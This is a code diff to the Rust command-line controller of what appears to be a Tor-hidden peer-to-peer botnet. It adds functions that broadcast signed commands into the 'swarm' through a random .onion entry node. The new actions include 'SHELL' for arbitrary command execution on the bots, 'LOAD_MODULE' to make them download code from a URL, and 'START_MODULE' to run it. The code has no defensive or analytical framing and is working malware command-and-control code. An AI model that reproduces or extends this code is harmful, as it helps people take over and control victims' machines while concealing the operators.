@@ -36,10 +36,33 @@ pub async fn handle_target(_bootstrap: String, _key: PathBuf, _target: String, _
     println!("Direct targeting in Mesh requires connecting to specific .onion. Not implemented in this CLI yet.");
 }
 
+pub async fn handle_load_module(bootstrap: String, key_path: PathBuf, url: String, name: String) {
+    let cmd = format!("LOAD_MODULE|{}|{}", url, name); // Helper to pack args into payload
+    // Re-use broadcast logic but with specific action
+    handle_broadcast_custom(bootstrap, key_path, "LOAD_MODULE".to_string(), format!("{}|{}", url, name)).await;
+}
+
+pub async fn handle_start_module(bootstrap: String, key_path: PathBuf, name: String, args: String) {
+    handle_broadcast_custom(bootstrap, key_path, "START_MODULE".to_string(), format!("{}|{}", name, args)).await;
+}
+
+// Refactor handle_broadcast to be generic wrapper
 pub async fn handle_broadcast(bootstrap: String, key_path: PathBuf, cmd: String) {
+    // Default to OLD broadcast which assumed "Command String" was for generic execution or legacy
+    // For now, let's treat "cmd" as raw parameters for a default action, or just use KILL_BOT
+    // But to keep existing functionality:
+    println!("Broadcast Generic: {}", cmd);
+    // Let's assume generic broadcast is just sending a raw action/param via some syntax, 
+    // OR we map "cmd" => Action: "SHELL", Params: cmd.
+    
+    // For this refactor, let's keep it simple: handle_broadcast wraps custom with fixed ID
+    handle_broadcast_custom(bootstrap, key_path, "SHELL".to_string(), cmd).await;
+}
+
+pub async fn handle_broadcast_custom(bootstrap: String, key_path: PathBuf, action: String, params: String) {
     let key = crypto::load_key(&key_path);
     
-    // 1. Connect to Bootstrap to find an entry node
+    // 1. Connect to Bootstrap
     let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
         Ok(c) => c,
         Err(e) => {
@@ -48,7 +71,6 @@ pub async fn handle_broadcast(bootstrap: String, key_path: PathBuf, cmd: String)
         }
     };
     
-    println!("Fetching entry nodes...");
     let peers = match client.get_peers().await {
         Ok(p) => p,
         Err(e) => {
@@ -58,48 +80,44 @@ pub async fn handle_broadcast(bootstrap: String, key_path: PathBuf, cmd: String)
     };
     
     if peers.is_empty() {
-        println!("No nodes found in Bootstrap to inject command.");
+        println!("No nodes found.");
         return;
     }
     
     // 2. Pick Random Entry Node
     use rand::seq::SliceRandom;
     let entry = peers.choose(&mut rand::thread_rng()).unwrap();
-    println!("Selected Entry Node: {} ({})", entry.pub_key, entry.onion_address);
-    
-    // Disconnect from Bootstrap (Drop client)
+    println!("Selected Entry: {}", entry.onion_address);
     drop(client);
     
-    // 3. Connect to Entry Node via Tor SOCKS5
-    let proxy_addr = "127.0.0.1:9050"; // Standard Tor SOCKS port
-    let onion_host = &entry.onion_address;
-    let onion_port = 80; // Standard for our Hidden Service
-    
-    println!("Connecting to Entry Node via Tor Proxy ({}) ...", proxy_addr);
-    let mut node_client = match GhostClient::<Socks5Stream<TcpStream>>::connect_via_tor(onion_host, onion_port, proxy_addr).await {
+    // 3. Connect via Tor
+    let proxy_addr = "127.0.0.1:9050";
+    let mut node_client = match GhostClient::<Socks5Stream<TcpStream>>::connect_via_tor(&entry.onion_address, 80, proxy_addr).await {
         Ok(c) => c,
         Err(e) => {
-            eprintln!("Failed to connect to Entry Node via Tor: {}", e);
-            eprintln!("Ensure Tor is running at {} and the Bot is online.", proxy_addr);
+            eprintln!("Tor Conn Error: {}", e);
             return;
         }
     };
     
-    println!("Connected! Performing Handshake...");
     let session_key = match node_client.handshake().await {
         Ok(k) => k,
-        Err(e) => {
-             eprintln!("Handshake Failed: {}", e);
-             return;
-        }
+        Err(e) => { eprintln!("Handshake Error: {}", e); return; }
     };
-    println!("Handshake Complete. Session Key Derived."); 
     
-    let payload = crypto::create_payload(cmd);
-    
+    // 4. Create Custom Payload
+    use protocol::CommandPayload;
+    let payload = CommandPayload {
+        id: uuid::Uuid::new_v4().to_string(),
+        action,
+        parameters: params,
+        execute_at: chrono::Utc::now().timestamp(), // Immediate
+        reply_to: Some(format!("master-reply.onion")), // Placeholder
+    };
+
     if let Err(e) = node_client.inject_command(payload, &key, &session_key).await {
         eprintln!("Injection Failed: {}", e);
     } else {
-        println!("Gossip Injected. Disconnecting.");
+        println!("Command Injected into Swarm.");
     }
 }
